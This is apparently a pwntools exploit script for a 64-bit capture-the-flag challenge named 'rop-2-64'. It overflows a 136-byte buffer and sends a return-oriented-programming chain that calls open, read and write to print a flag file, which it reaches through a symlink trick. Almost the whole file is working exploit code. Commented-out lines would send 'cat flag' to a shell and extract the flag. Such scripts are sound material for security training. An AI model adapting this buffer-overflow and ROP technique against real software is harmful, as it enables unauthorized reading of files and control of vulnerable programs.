from pwn import *
import os

DEBUG = False
file = "./rop-2-64"
env = {"PATH":"$PATH:."}

elf = ELF(file)
max_len = 136

# launch the main process (still boilerplate)
if DEBUG:
    context.log_level = 'DEBUG'
    context.terminal = ['tmux', 'splitw', '-h']
    io = gdb.debug(file, env=env, gdbscript='''
b *input_func
b *0x00000000004006bb
continue
''')

else:
    io = process(file, env=env)


# END SETUP BOILERPLATE
# BEGIN CHALLENGE-SPECIFIC CODE

os.symlink("./flag", "./main")

write = p64(elf.symbols["write"])
read = p64(elf.symbols["read"])
opn = p64(elf.symbols["open"])
main = p64(0x4003a7)
writeable = p64(0x601000 + 0x500)

pop_rdi = p64(0x0000000000400743)
pop_rsi_2 = p64(0x0000000000400741)
pop_rdx = p64(0x0000000000400668)

payload = flat (
    b"A" * max_len,
    pop_rdi,
    main,
    pop_rsi_2,
    p64(0),
    b"A" * 8,
    pop_rdx,
    p64(0),
    opn,
    pop_rdi,
    p64(0x3),
    pop_rsi_2,
    writeable,
    b"A" * 8,
    pop_rdx,
    p64(100),
    read,
    pop_rdi,
    p64(0x1),
    pop_rsi_2,
    writeable,
    b"A" * 8,
    pop_rdx,
    p64(100),
    write,
)

io.send(payload)
io.interactive()

# END CHALLENGE-SPECIFIC CODE
# BEGIN FLAG RETRIEVAL BOILERPLATE

# import re
# io.sendlineafter(b'Spawning a privileged shell', b'cat flag')
# flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
# print(flag)
os.unlink("./main")
